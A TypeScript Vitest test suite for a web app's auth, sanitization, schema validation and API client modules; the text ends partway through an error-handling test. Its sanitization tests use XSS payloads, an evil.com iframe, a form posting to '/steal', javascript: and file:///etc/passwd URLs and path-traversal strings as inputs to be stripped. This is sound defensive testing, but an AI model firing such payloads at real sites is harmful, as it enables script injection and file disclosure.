/**
 * ForensicBridge Comprehensive Test Suite
 *
 * Covers: Auth Module, Sanitization, Zod Schemas, API Client, Security
 * 65+ new tests with no overlap from components.test.tsx
 *
 * Run with: npm test
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

// ============================================================================
// Auth Module Tests
// ============================================================================

describe('Auth Module', () => {
    // We need to reset module state between tests since auth.ts uses module-level variables
    let authModule: typeof import('@/lib/auth');

    beforeEach(async () => {
        // Clear all storage
        localStorage.clear();
        sessionStorage.clear();
        // Re-import to reset module-level state (csrfToken, csrfTokenExpiry)
        vi.resetModules();
        authModule = await import('@/lib/auth');
    });

    afterEach(() => {
        vi.restoreAllMocks();
    });

    describe('getAuthState', () => {
        it('returns unauthenticated state when localStorage is empty', () => {
            const state = authModule.getAuthState();
            expect(state.user).toBeNull();
            expect(state.isAuthenticated).toBe(false);
        });

        it('returns authenticated state when user and isLoggedIn are set', () => {
            const user = { id: 1, email: 'test@example.com', name: 'Test User' };
            localStorage.setItem('user', JSON.stringify(user));
            localStorage.setItem('isLoggedIn', 'true');

            const state = authModule.getAuthState();
            expect(state.isAuthenticated).toBe(true);
            expect(state.user).toEqual(user);
        });

        it('returns unauthenticated when isLoggedIn is false even with user present', () => {
            const user = { id: 1, email: 'test@example.com' };
            localStorage.setItem('user', JSON.stringify(user));
            localStorage.setItem('isLoggedIn', 'false');

            const state = authModule.getAuthState();
            expect(state.isAuthenticated).toBe(false);
        });

        it('handles corrupted JSON in localStorage gracefully', () => {
            localStorage.setItem('user', '{invalid json!!!');
            localStorage.setItem('isLoggedIn', 'true');

            const state = authModule.getAuthState();
            expect(state.user).toBeNull();
            expect(state.isAuthenticated).toBe(false);
        });

        it('requires both user and isLoggedIn for authentication', () => {
            localStorage.setItem('isLoggedIn', 'true');
            // No user object set

            const state = authModule.getAuthState();
            expect(state.isAuthenticated).toBe(false);
        });
    });

    describe('setAuthState', () => {
        it('stores user object in localStorage as JSON', () => {
            const user = { id: 42, email: 'admin@forensicbridge.com', name: 'Admin' };
            authModule.setAuthState(user);

            const stored = JSON.parse(localStorage.getItem('user')!);
            expect(stored.id).toBe(42);
            expect(stored.email).toBe('admin@forensicbridge.com');
        });

        it('sets isLoggedIn flag to true', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' });
            expect(localStorage.getItem('isLoggedIn')).toBe('true');
        });

        it('initializes session start time in sessionStorage', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' });

            const sessionStart = sessionStorage.getItem('fb_session_start');
            expect(sessionStart).not.toBeNull();
            const startTime = parseInt(sessionStart!, 10);
            expect(startTime).toBeGreaterThan(0);
            expect(startTime).toBeLessThanOrEqual(Date.now());
        });

        it('initializes last activity time in sessionStorage', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' });

            const lastActivity = sessionStorage.getItem('fb_last_activity');
            expect(lastActivity).not.toBeNull();
            const activityTime = parseInt(lastActivity!, 10);
            expect(activityTime).toBeGreaterThan(0);
        });

        it('sets CSRF token when provided', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' }, 'csrf-token-abc');
            expect(authModule.getCsrfToken()).toBe('csrf-token-abc');
        });

        it('does not set CSRF token when not provided', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' });
            expect(authModule.getCsrfToken()).toBeNull();
        });
    });

    describe('clearAuth', () => {
        it('removes user from localStorage', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' });
            authModule.clearAuth();
            expect(localStorage.getItem('user')).toBeNull();
        });

        it('removes isLoggedIn from localStorage', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' });
            authModule.clearAuth();
            expect(localStorage.getItem('isLoggedIn')).toBeNull();
        });

        it('clears session timers from sessionStorage', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' });
            authModule.clearAuth();
            expect(sessionStorage.getItem('fb_session_start')).toBeNull();
            expect(sessionStorage.getItem('fb_last_activity')).toBeNull();
        });

        it('clears CSRF token', () => {
            authModule.setCsrfToken('my-csrf-token');
            expect(authModule.getCsrfToken()).toBe('my-csrf-token');
            authModule.clearAuth();
            expect(authModule.getCsrfToken()).toBeNull();
        });
    });

    describe('isAuthenticated', () => {
        it('returns false when no auth state exists', () => {
            expect(authModule.isAuthenticated()).toBe(false);
        });

        it('returns true after setAuthState', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' });
            expect(authModule.isAuthenticated()).toBe(true);
        });

        it('returns false after clearAuth', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' });
            authModule.clearAuth();
            expect(authModule.isAuthenticated()).toBe(false);
        });
    });

    describe('isSessionExpired', () => {
        it('returns false when no session timers exist', () => {
            expect(authModule.isSessionExpired()).toBe(false);
        });

        it('returns false for a fresh session', () => {
            authModule.setAuthState({ id: 1, email: 'a@b.com' });
            expect(authModule.isSessionExpired()).toBe(false);
        });

        it('returns true when session exceeds 8 hour max duration', () => {
            // Set session start to 9 hours ago
            const nineHoursAgo = Date.now() - (9 * 60 * 60 * 1000);
            sessionStorage.setItem('fb_session_start', String(nineHoursAgo));
            sessionStorage.setItem('fb_last_activity', String(Date.now()));

            expect(authModule.isSessionExpired()).toBe(true);
        });

        it('returns false when session is under 8 hour max', () => {
            const sevenHoursAgo = Date.now() - (7 * 60 * 60 * 1000);
            sessionStorage.setItem('fb_session_start', String(sevenHoursAgo));
            sessionStorage.setItem('fb_last_activity', String(Date.now()));

            expect(authModule.isSessionExpired()).toBe(false);
        });

        it('returns true when inactivity exceeds 30 minutes', () => {
            const now = Date.now();
            sessionStorage.setItem('fb_session_start', String(now - (1 * 60 * 60 * 1000))); // 1h ago
            sessionStorage.setItem('fb_last_activity', String(now - (31 * 60 * 1000))); // 31min ago

            expect(authModule.isSessionExpired()).toBe(true);
        });

        it('returns false when last activity is within 30 minutes', () => {
            const now = Date.now();
            sessionStorage.setItem('fb_session_start', String(now - (1 * 60 * 60 * 1000))); // 1h ago
            sessionStorage.setItem('fb_last_activity', String(now - (10 * 60 * 1000))); // 10min ago

            expect(authModule.isSessionExpired()).toBe(false);
        });
    });

    describe('CSRF Token Management', () => {
        it('getCsrfToken returns null initially', () => {
            expect(authModule.getCsrfToken()).toBeNull();
        });

        it('setCsrfToken stores and retrieves token', () => {
            authModule.setCsrfToken('test-csrf-123');
            expect(authModule.getCsrfToken()).toBe('test-csrf-123');
        });

        it('setCsrfToken with null clears the token', () => {
            authModule.setCsrfToken('token-abc');
            authModule.setCsrfToken(null);
            expect(authModule.getCsrfToken()).toBeNull();
        });

        it('getAuthHeader returns empty object when no CSRF needed', () => {
            const headers = authModule.getAuthHeader(false);
            expect(headers).toEqual({});
        });

        it('getAuthHeader includes CSRF token when requested and available', () => {
            authModule.setCsrfToken('csrf-for-header');
            const headers = authModule.getAuthHeader(true);
            expect(headers['X-CSRF-Token']).toBe('csrf-for-header');
        });

        it('getAuthHeader omits CSRF when requested but token is null', () => {
            const headers = authModule.getAuthHeader(true);
            expect(headers['X-CSRF-Token']).toBeUndefined();
        });
    });

    describe('User Object Serialization', () => {
        it('preserves full user object with all fields through round-trip', () => {
            const user = {
                id: 99,
                email: 'cpa@firm.com',
                name: 'Jane CPA',
                first_name: 'Jane',
                last_name: 'CPA',
                company: 'Big Firm LLC',
                company_name: 'Big Firm LLC',
            };
            authModule.setAuthState(user);
            const state = authModule.getAuthState();
            expect(state.user).toEqual(user);
        });

        it('handles user with minimal fields', () => {
            const user = { id: 1, email: 'min@test.com' };
            authModule.setAuthState(user);
            const state = authModule.getAuthState();
            expect(state.user?.id).toBe(1);
            expect(state.user?.email).toBe('min@test.com');
        });
    });
});

// ============================================================================
// Sanitization Tests
// ============================================================================

describe('Sanitization Module', () => {
    let sanitizeModule: typeof import('@/lib/sanitize');

    beforeEach(async () => {
        vi.resetModules();
        sanitizeModule = await import('@/lib/sanitize');
    });

    describe('escapeHtml', () => {
        it('escapes ampersand', () => {
            expect(sanitizeModule.escapeHtml('AT&T')).toBe('AT&amp;T');
        });

        it('escapes less-than sign', () => {
            expect(sanitizeModule.escapeHtml('a < b')).toBe('a &lt; b');
        });

        it('escapes greater-than sign', () => {
            expect(sanitizeModule.escapeHtml('a > b')).toBe('a &gt; b');
        });

        it('escapes double quotes', () => {
            expect(sanitizeModule.escapeHtml('say "hello"')).toBe('say &quot;hello&quot;');
        });

        it('escapes single quotes', () => {
            expect(sanitizeModule.escapeHtml("it's")).toBe('it&#x27;s');
        });

        it('escapes forward slash', () => {
            expect(sanitizeModule.escapeHtml('a/b')).toBe('a&#x2F;b');
        });

        it('escapes backtick', () => {
            expect(sanitizeModule.escapeHtml('`code`')).toBe('&#x60;code&#x60;');
        });

        it('escapes equals sign', () => {
            expect(sanitizeModule.escapeHtml('a=b')).toBe('a&#x3D;b');
        });

        it('escapes all entities in combination', () => {
            const input = '<img src="x" onerror=\'alert(1)\'>';
            const result = sanitizeModule.escapeHtml(input);
            expect(result).not.toContain('<');
            expect(result).not.toContain('>');
            expect(result).not.toContain('"');
            expect(result).not.toContain("'");
        });

        it('returns empty string for non-string input', () => {
            expect(sanitizeModule.escapeHtml(42 as unknown as string)).toBe('');
            expect(sanitizeModule.escapeHtml(null as unknown as string)).toBe('');
        });
    });

    describe('sanitize.text', () => {
        it('escapes basic script tag XSS payload', () => {
            const result = sanitizeModule.sanitize.text('<script>alert("xss")</script>');
            expect(result).not.toContain('<script>');
            expect(result).toContain('&lt;script&gt;');
        });

        it('removes null bytes', () => {
            const result = sanitizeModule.sanitize.text('hello\x00world');
            expect(result).not.toContain('\x00');
            expect(result).toContain('helloworld');
        });

        it('trims whitespace', () => {
            const result = sanitizeModule.sanitize.text('  hello world  ');
            expect(result).toBe('hello world');
        });

        it('returns empty string for null input', () => {
            expect(sanitizeModule.sanitize.text(null)).toBe('');
        });

        it('returns empty string for undefined input', () => {
            expect(sanitizeModule.sanitize.text(undefined)).toBe('');
        });

        it('returns empty string for empty string', () => {
            expect(sanitizeModule.sanitize.text('')).toBe('');
        });

        it('returns empty string for non-string input', () => {
            expect(sanitizeModule.sanitize.text(123 as unknown as string)).toBe('');
        });
    });

    describe('sanitize.html', () => {
        it('removes script tags', () => {
            const result = sanitizeModule.sanitize.html('<p>Hello</p><script>evil()</script>');
            expect(result).not.toContain('<script>');
            expect(result).not.toContain('evil()');
        });

        it('removes inline event handlers with double quotes', () => {
            const result = sanitizeModule.sanitize.html('<div onmouseover="steal()">hover</div>');
            expect(result).not.toContain('onmouseover');
            expect(result).not.toContain('steal()');
        });

        it('removes inline event handlers with single quotes', () => {
            const result = sanitizeModule.sanitize.html("<img onerror='alert(1)' src='x'>");
            expect(result).not.toContain('onerror');
        });

        it('removes iframe tags', () => {
            const result = sanitizeModule.sanitize.html('<iframe src="https://evil.com"></iframe>');
            expect(result).not.toContain('<iframe');
            expect(result).not.toContain('</iframe>');
        });

        it('removes object and embed tags', () => {
            const result = sanitizeModule.sanitize.html('<object data="evil.swf"></object><embed src="evil.swf">');
            expect(result).not.toContain('<object');
            expect(result).not.toContain('<embed');
        });

        it('removes form and input tags', () => {
            const result = sanitizeModule.sanitize.html('<form action="/steal"><input type="password"></form>');
            expect(result).not.toContain('<form');
            expect(result).not.toContain('<input');
        });

        it('returns empty string for null input', () => {
            expect(sanitizeModule.sanitize.html(null)).toBe('');
        });

        it('returns empty string for undefined input', () => {
            expect(sanitizeModule.sanitize.html(undefined)).toBe('');
        });
    });

    describe('sanitize.url', () => {
        it('blocks javascript: protocol', () => {
            expect(sanitizeModule.sanitize.url('javascript:alert(1)')).toBe('');
        });

        it('blocks data: protocol', () => {
            expect(sanitizeModule.sanitize.url('data:text/html,<script>alert(1)</script>')).toBe('');
        });

        it('blocks vbscript: protocol', () => {
            expect(sanitizeModule.sanitize.url('vbscript:msgbox("xss")')).toBe('');
        });

        it('blocks file: protocol', () => {
            expect(sanitizeModule.sanitize.url('file:///etc/passwd')).toBe('');
        });

        it('allows http:// URLs to pass through', () => {
            const url = 'http://example.com/page';
            expect(sanitizeModule.sanitize.url(url)).toBe(url);
        });

        it('allows https:// URLs to pass through', () => {
            const url = 'https://forensicbridge.com/dashboard';
            expect(sanitizeModule.sanitize.url(url)).toBe(url);
        });

        it('allows relative URLs starting with /', () => {
            expect(sanitizeModule.sanitize.url('/api/dashboard')).toBe('/api/dashboard');
        });

        it('prepends https:// to bare domain names', () => {
            expect(sanitizeModule.sanitize.url('example.com')).toBe('https://example.com');
        });

        it('returns empty string for null', () => {
            expect(sanitizeModule.sanitize.url(null)).toBe('');
        });

        it('returns empty string for undefined', () => {
            expect(sanitizeModule.sanitize.url(undefined)).toBe('');
        });
    });

    describe('sanitize.filename', () => {
        it('removes path traversal sequences (../)', () => {
            const result = sanitizeModule.sanitize.filename('../../etc/passwd');
            expect(result).not.toContain('..');
            expect(result).not.toContain('/');
        });

        it('removes forward slashes', () => {
            const result = sanitizeModule.sanitize.filename('path/to/file.txt');
            expect(result).not.toContain('/');
        });

        it('removes backslashes', () => {
            const result = sanitizeModule.sanitize.filename('path\\to\\file.txt');
            expect(result).not.toContain('\\');
        });

        it('removes null bytes and control characters', () => {
            const result = sanitizeModule.sanitize.filename('file\x00name\x01.txt');
            expect(result).not.toContain('\x00');
            expect(result).not.toContain('\x01');
        });

        it('replaces special characters with underscores', () => {
            const result = sanitizeModule.sanitize.filename('file name (copy).txt');
            expect(result).not.toContain(' ');
            expect(result).not.toContain('(');
            expect(result).not.toContain(')');
        });

        it('prevents hidden files by replacing leading dot', () => {
            const result = sanitizeModule.sanitize.filename('.htaccess');
            expect(result).not.toMatch(/^\./);
            expect(result[0]).toBe('_');
        });

        it('returns "file" for empty input', () => {
            expect(sanitizeModule.sanitize.filename('')).toBe('');
            expect(sanitizeModule.sanitize.filename(null)).toBe('');
        });

        it('preserves safe filenames', () => {
            expect(sanitizeModule.sanitize.filename('report-2026.pdf')).toBe('report-2026.pdf');
        });
    });

    describe('sanitize.object', () => {
        it('sanitizes string values in a flat object', () => {
            const input = { name: '<script>alert(1)</script>', count: 5 };
            const result = sanitizeModule.sanitize.object(input);
            expect(result.name).not.toContain('<script>');
            expect(result.count).toBe(5);
        });

        it('recursively sanitizes nested objects', () => {
            const input = {
                user: {
                    name: '<img onerror="hack()">',
                    role: 'admin',
                },
            };
            const result = sanitizeModule.sanitize.object(input);
            expect((result.user as { name: string }).name).not.toContain('<img');
        });

        it('sanitizes arrays of strings', () => {
            const input = ['safe', '<script>bad</script>', 'also safe'];
            const result = sanitizeModule.sanitize.object(input);
            expect(result[0]).toBe('safe');
            expect(result[1]).not.toContain('<script>');
            expect(result[2]).toBe('also safe');
        });

        it('returns non-object inputs unchanged', () => {
            expect(sanitizeModule.sanitize.object(null as unknown as object)).toBeNull();
        });

        it('preserves numeric and boolean values', () => {
            const input = { count: 42, active: true, label: 'ok' };
            const result = sanitizeModule.sanitize.object(input);
            expect(result.count).toBe(42);
            expect(result.active).toBe(true);
        });
    });
});

// ============================================================================
// Zod Schema Validation Tests
// ============================================================================

describe('Zod Schema Validation', () => {
    let schemas: typeof import('@/lib/schemas');

    beforeEach(async () => {
        vi.resetModules();
        schemas = await import('@/lib/schemas');
    });

    describe('DashboardOverviewSchema', () => {
        const validOverview = {
            overview: {
                total_migrations: 150,
                completed_migrations: 120,
                failed_migrations: 5,
                in_progress: 3,
                success_rate: 96.0,
                avg_duration_minutes: 45.2,
                recent_completed_24h: 8,
            },
        };

        it('accepts valid dashboard overview data', () => {
            const result = schemas.DashboardOverviewSchema.safeParse(validOverview);
            expect(result.success).toBe(true);
        });

        it('accepts overview with optional pending_review', () => {
            const withPendingReview = {
                overview: { ...validOverview.overview, pending_review: 2 },
            };
            const result = schemas.DashboardOverviewSchema.safeParse(withPendingReview);
            expect(result.success).toBe(true);
        });

        it('rejects when overview object is missing', () => {
            const result = schemas.DashboardOverviewSchema.safeParse({});
            expect(result.success).toBe(false);
        });

        it('rejects negative numbers for nonnegative fields', () => {
            const invalid = {
                overview: { ...validOverview.overview, total_migrations: -1 },
            };
            const result = schemas.DashboardOverviewSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });

        it('rejects success_rate above 100', () => {
            const invalid = {
                overview: { ...validOverview.overview, success_rate: 101 },
            };
            const result = schemas.DashboardOverviewSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });

        it('rejects success_rate below 0', () => {
            const invalid = {
                overview: { ...validOverview.overview, success_rate: -5 },
            };
            const result = schemas.DashboardOverviewSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });

        it('rejects floating point numbers for integer fields', () => {
            const invalid = {
                overview: { ...validOverview.overview, total_migrations: 1.5 },
            };
            const result = schemas.DashboardOverviewSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });
    });

    describe('MigrationStatusSchema', () => {
        const validMigration = {
            migration_id: 'mig_test_001',
            status: 'processing' as const,
            progress_percent: 65,
            current_step: 'Transforming invoices',
            created_at: '2026-01-15T10:00:00Z',
        };

        it('accepts valid migration status', () => {
            const result = schemas.MigrationStatusSchema.safeParse(validMigration);
            expect(result.success).toBe(true);
        });

        it('accepts all valid status enum values', () => {
            const statuses = ['pending', 'uploading', 'uploaded', 'provisioning', 'processing', 'completed', 'failed', 'cancelled'];
            statuses.forEach((status) => {
                const data = { ...validMigration, status };
                const result = schemas.MigrationStatusSchema.safeParse(data);
                expect(result.success).toBe(true);
            });
        });

        it('rejects invalid status enum value', () => {
            const invalid = { ...validMigration, status: 'unknown_status' };
            const result = schemas.MigrationStatusSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });

        it('rejects missing required migration_id', () => {
            const { migration_id: _, ...noId } = validMigration;
            const result = schemas.MigrationStatusSchema.safeParse(noId);
            expect(result.success).toBe(false);
        });

        it('rejects progress_percent above 100', () => {
            const invalid = { ...validMigration, progress_percent: 150 };
            const result = schemas.MigrationStatusSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });

        it('rejects progress_percent below 0', () => {
            const invalid = { ...validMigration, progress_percent: -10 };
            const result = schemas.MigrationStatusSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });

        it('accepts nullable completed_at and error_message', () => {
            const data = { ...validMigration, completed_at: null, error_message: null };
            const result = schemas.MigrationStatusSchema.safeParse(data);
            expect(result.success).toBe(true);
        });
    });

    describe('MigrationListSchema', () => {
        it('accepts valid migration list with pagination', () => {
            const valid = {
                migrations: [
                    {
                        migration_id: 'mig_001',
                        status: 'completed' as const,
                        progress_percent: 100,
                        current_step: 'Done',
                        created_at: '2026-01-15T00:00:00Z',
                    },
                ],
                pagination: { page: 1, per_page: 20, total: 1, pages: 1 },
            };
            const result = schemas.MigrationListSchema.safeParse(valid);
            expect(result.success).toBe(true);
        });

        it('accepts empty migrations array', () => {
            const valid = {
                migrations: [],
                pagination: { page: 1, per_page: 20, total: 0, pages: 0 },
            };
            const result = schemas.MigrationListSchema.safeParse(valid);
            expect(result.success).toBe(true);
        });

        it('rejects pagination with page 0 (must be positive)', () => {
            const invalid = {
                migrations: [],
                pagination: { page: 0, per_page: 20, total: 0, pages: 0 },
            };
            const result = schemas.MigrationListSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });

        it('rejects missing pagination object', () => {
            const invalid = { migrations: [] };
            const result = schemas.MigrationListSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });
    });

    describe('LoginResponseSchema', () => {
        const validLogin = {
            success: true,
            token: 'jwt-token-abc123',
            user: {
                id: 1,
                email: 'user@example.com',
                first_name: 'John',
                last_name: 'Doe',
            },
        };

        it('accepts valid login response', () => {
            const result = schemas.LoginResponseSchema.safeParse(validLogin);
            expect(result.success).toBe(true);
        });

        it('accepts login response with optional csrf_token', () => {
            const withCsrf = { ...validLogin, csrf_token: 'csrf-xyz' };
            const result = schemas.LoginResponseSchema.safeParse(withCsrf);
            expect(result.success).toBe(true);
        });

        it('accepts login response without csrf_token (it is optional)', () => {
            const result = schemas.LoginResponseSchema.safeParse(validLogin);
            expect(result.success).toBe(true);
        });

        it('rejects when user object is missing', () => {
            const { user: _, ...noUser } = validLogin;
            const result = schemas.LoginResponseSchema.safeParse(noUser);
            expect(result.success).toBe(false);
        });

        it('rejects when token is missing', () => {
            const { token: _, ...noToken } = validLogin;
            const result = schemas.LoginResponseSchema.safeParse(noToken);
            expect(result.success).toBe(false);
        });
    });

    describe('TrialBalanceSchema', () => {
        it('accepts valid balanced trial balance', () => {
            const balanced = {
                source_trial_balance: 1000000,
                destination_trial_balance: 1000000,
                discrepancy: 0,
                is_balanced: true,
                forensic_status: 'VERIFIED' as const,
                verification_timestamp: '2026-01-15T12:00:00Z',
            };
            const result = schemas.TrialBalanceSchema.safeParse(balanced);
            expect(result.success).toBe(true);
        });

        it('accepts trial balance with discrepancy', () => {
            const unbalanced = {
                source_trial_balance: 1000000,
                destination_trial_balance: 999580,
                discrepancy: 420,
                is_balanced: false,
                forensic_status: 'DISCREPANCY_DETECTED' as const,
            };
            const result = schemas.TrialBalanceSchema.safeParse(unbalanced);
            expect(result.success).toBe(true);
        });

        it('rejects invalid forensic_status enum', () => {
            const invalid = {
                forensic_status: 'INVALID_STATUS',
            };
            const result = schemas.TrialBalanceSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });

        it('accepts all valid forensic_status values', () => {
            const statuses = ['VERIFIED', 'DISCREPANCY_DETECTED', 'PENDING', 'NOT_AVAILABLE'];
            statuses.forEach((status) => {
                const data = { forensic_status: status };
                const result = schemas.TrialBalanceSchema.safeParse(data);
                expect(result.success).toBe(true);
            });
        });
    });

    describe('UserInfoSchema', () => {
        const validUser = {
            id: 1,
            email: 'cpa@firm.com',
            first_name: 'Jane',
            last_name: 'Doe',
            tier: 'professional',
            tier_name: 'Professional',
            migrations_remaining: 10,
            migrations_purchased: 15,
            migrations_used: 5,
        };

        it('accepts valid user info', () => {
            const result = schemas.UserInfoSchema.safeParse(validUser);
            expect(result.success).toBe(true);
        });

        it('rejects invalid email format', () => {
            const invalid = { ...validUser, email: 'not-an-email' };
            const result = schemas.UserInfoSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });

        it('rejects id of 0 (must be positive)', () => {
            const invalid = { ...validUser, id: 0 };
            const result = schemas.UserInfoSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });

        it('rejects negative migrations_remaining', () => {
            const invalid = { ...validUser, migrations_remaining: -1 };
            const result = schemas.UserInfoSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });
    });

    describe('UploadSessionSchema', () => {
        it('accepts valid upload session', () => {
            const valid = {
                session_id: 'sess_abc123',
                upload_url: 'https://s3.amazonaws.com/bucket/upload',
                expires_at: '2026-01-15T12:00:00Z',
            };
            const result = schemas.UploadSessionSchema.safeParse(valid);
            expect(result.success).toBe(true);
        });

        it('accepts session with only required session_id', () => {
            const minimal = { session_id: 'sess_minimal' };
            const result = schemas.UploadSessionSchema.safeParse(minimal);
            expect(result.success).toBe(true);
        });

        it('rejects invalid upload_url format', () => {
            const invalid = { session_id: 'sess_1', upload_url: 'not a url' };
            const result = schemas.UploadSessionSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });
    });

    describe('UploadCompleteSchema', () => {
        it('accepts valid upload complete response', () => {
            const valid = {
                success: true,
                migration_id: 'mig_complete_001',
                message: 'Upload completed successfully',
            };
            const result = schemas.UploadCompleteSchema.safeParse(valid);
            expect(result.success).toBe(true);
        });

        it('accepts without optional message', () => {
            const valid = { success: true, migration_id: 'mig_002' };
            const result = schemas.UploadCompleteSchema.safeParse(valid);
            expect(result.success).toBe(true);
        });

        it('rejects missing migration_id', () => {
            const invalid = { success: true };
            const result = schemas.UploadCompleteSchema.safeParse(invalid);
            expect(result.success).toBe(false);
        });
    });
});

// ============================================================================
// API Client Tests
// ============================================================================

describe('API Client', () => {
    let ApiClient: typeof import('@/lib/api').ApiClient;
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(async () => {
        vi.resetModules();
        localStorage.clear();
        sessionStorage.clear();

        // Create a controllable fetch mock
        fetchMock = vi.fn();
        global.fetch = fetchMock as unknown as typeof fetch;

        const apiModule = await import('@/lib/api');
        ApiClient = apiModule.ApiClient;
    });

    afterEach(() => {
        vi.restoreAllMocks();
        // Restore default setup.ts fetch mock
        global.fetch = (async () => {
            return new Response(JSON.stringify({ success: true }), {
                status: 200,
                headers: { 'Content-Type': 'application/json' },
            });
        }) as typeof fetch;
    });

    function makeJsonResponse(data: unknown, status = 200, headers: Record<string, string> = {}) {
        return new Response(JSON.stringify(data), {
            status,
            statusText: status === 200 ? 'OK' : 'Error',
            headers: { 'Content-Type': 'application/json', ...headers },
        });
    }

    describe('Request Deduplication', () => {
        it('makes only one fetch call for concurrent identical GET requests', async () => {
            let resolveResponse: (value: Response) => void;
            const pendingResponse = new Promise<Response>((resolve) => {
                resolveResponse = resolve;
            });

            fetchMock.mockReturnValue(pendingResponse);

            const client = new ApiClient('http://localhost:5000', 30000, 0, 1000, 200);
            const promise1 = client.getDashboardOverview();
            const promise2 = client.getDashboardOverview();

            // Resolve and verify only one fetch call was made (deduplication)
            resolveResponse!(makeJsonResponse({
                overview: {
                    total_migrations: 10, completed_migrations: 5,
                    failed_migrations: 0, in_progress: 2, success_rate: 100,
                    avg_duration_minutes: 30, recent_completed_24h: 1,
                },
            }));

            const [result1, result2] = await Promise.all([promise1, promise2]);
            expect(fetchMock).toHaveBeenCalledTimes(1);
            // Both return the same data
            expect(result1.success).toBe(result2.success);
        });

        it('does NOT deduplicate POST requests', async () => {
            // Pre-set CSRF token to prevent auto-fetch side effect
            const authModule = await import('@/lib/auth');
            authModule.setCsrfToken('pre-set-csrf');

            fetchMock.mockResolvedValue(makeJsonResponse({ success: true }));

            const client = new ApiClient('http://localhost:5000', 30000, 0, 1000, 200);
            const p1 = client.cancelMigration('mig_001');
            const p2 = client.cancelMigration('mig_001');

            await Promise.all([p1, p2]);
            // POST requests should each trigger their own fetch
            expect(fetchMock).toHaveBeenCalledTimes(2);
        });
    });

    describe('Timeout Handling', () => {
        it('returns timeout error when request exceeds timeout', async () => {
            // Mock fetch that never resolves but respects abort signal
            fetchMock.mockImplementation((_url: string, init?: RequestInit) => {
                return new Promise<Response>((_resolve, reject) => {
                    if (init?.signal) {
                        init.signal.addEventListener('abort', () => {
                            const error = new Error('The operation was aborted.');
                            error.name = 'AbortError';
                            reject(error);
                        });
                    }
                });
            });

            // Very short timeout to trigger quickly
            const client = new ApiClient('http://localhost:5000', 50, 0);
            const result = await client.getHealth();

            expect(result.success).toBe(false);
            expect(result.error).toContain('timed out');
        });
    });

    describe('Retry with Backoff', () => {
        it('retries on 500 server errors up to maxRetries', async () => {
            fetchMock
                .mockResolvedValueOnce(makeJsonResponse({ error: 'Internal Error' }, 500))
                .mockResolvedValueOnce(makeJsonResponse({ error: 'Internal Error' }, 500))
                .mockResolvedValueOnce(makeJsonResponse({ status: 'ok' }, 200));

            // maxRetries=2 means 3 total attempts (initial + 2 retries), very short delay
            const client = new ApiClient('http://localhost:5000', 30000, 2, 1);
            const result = await client.getHealth();

            expect(result.success).toBe(true);
            expect(fetchMock).toHaveBeenCalledTimes(3);
        });

        it('returns error after exhausting all retries', async () => {
            fetchMock.mockResolvedValue(makeJsonResponse({ error: 'Server Down' }, 500));

            const client = new ApiClient('http://localhost:5000', 30000, 1, 1);
            const result = await client.getHealth();

            expect(result.success).toBe(false);
            // 1 initial + 1 retry = 2 total
            expect(fetchMock).toHaveBeenCalledTimes(2);
        });

        it('does not retry on 401 unauthorized', async () => {
            fetchMock.mockResolvedValue(makeJsonResponse({ error: 'Unauthorized' }, 401));

            const client = new ApiClient('http://localhost:5000', 30000, 3, 1);
            const result = await client.getHealth();

            expect(result.success).toBe(false);
            expect(fetchMock).toHaveBeenCalledTimes(1);
        });

        it('does not retry on 403 forbidden', async () => {
            fetchMock.mockResolvedValue(makeJsonResponse({ error: 'Forbidden' }, 403));

            const client = new ApiClient('http://localhost:5000', 30000, 3, 1);
            const result = await client.getHealth();

            expect(result.success).toBe(false);
            expect(fetchMock).toHaveBeenCalledTimes(1);
        });
    });

    describe('Auth and CSRF Header Injection', () => {
        it('includes Content-Type application/json header', async () => {
            fetchMock.mockResolvedValue(makeJsonResponse({ success: true }));

            const client = new ApiClient('http://localhost:5000', 30000, 0);
            await client.getHealth();

            const callArgs = fetchMock.mock.calls[0];
            expect(callArgs[1].headers['Content-Type']).toBe('application/json');
        });

        it('includes credentials: include for httpOnly cookie auth', async () => {
            fetchMock.mockResolvedValue(makeJsonResponse({ success: true }));

            const client = new ApiClient('http://localhost:5000', 30000, 0);
            await client.getHealth();

            const callArgs = fetchMock.mock.calls[0];
            expect(callArgs[1].credentials).toBe('include');
        });

        it('includes X-Request-ID header for correlation', async () => {
            fetchMock.mockResolvedValue(makeJsonResponse({ success: true }));

            const client = new ApiClient('http://localhost:5000', 30000, 0);
            await client.getHealth();

            const callArgs = fetchMock.mock.calls[0];
            const requestId = callArgs[1].headers['X-Request-ID'];
            expect(requestId).toBeDefined();
            expect(typeof requestId).toBe('string');
            expect(requestId.length).toBeGreaterThan(0);
        });

        it('injects CSRF token on POST requests when available', async () => {
            // Set up CSRF token
            const authModule = await import('@/lib/auth');
            authModule.setCsrfToken('csrf-test-token-999');

            fetchMock.mockResolvedValue(makeJsonResponse({ success: true }));

            const client = new ApiClient('http://localhost:5000', 30000, 0);
            await client.cancelMigration('mig_001');

            const callArgs = fetchMock.mock.calls[0];
            expect(callArgs[1].headers['X-CSRF-Token']).toBe('csrf-test-token-999');
        });
    });

    describe('Error Response Handling', () => {
        it('returns error message from 401 response body', async () => {
            fetchMock.mockResolvedValue(makeJsonResponse({ error: 'Session expired' }, 401));

